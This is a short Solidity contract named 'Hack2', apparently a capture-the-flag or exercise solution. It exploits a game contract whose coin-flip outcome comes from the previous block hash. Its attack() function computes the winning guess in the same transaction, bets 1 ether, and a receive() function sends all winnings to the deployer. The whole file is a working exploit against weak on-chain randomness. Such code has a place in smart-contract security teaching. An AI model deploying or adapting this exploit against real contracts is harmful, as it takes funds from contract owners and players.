// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

interface IGame2 {
    function play(bool guess) external payable;
}

contract Hack2{
    IGame2 game2;
    address owner;

    constructor(address _game2){
        game2 = IGame2(_game2);
        owner = msg.sender;
    }

    function attack() external payable{
        uint256 number = uint256(blockhash(block.number - 1)) % 2;
        bool answer = number == 1 ? true : false;

        game2.play{value: 1 ether}(answer);
    }

    receive() external payable{
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to sent ETH");
    }
}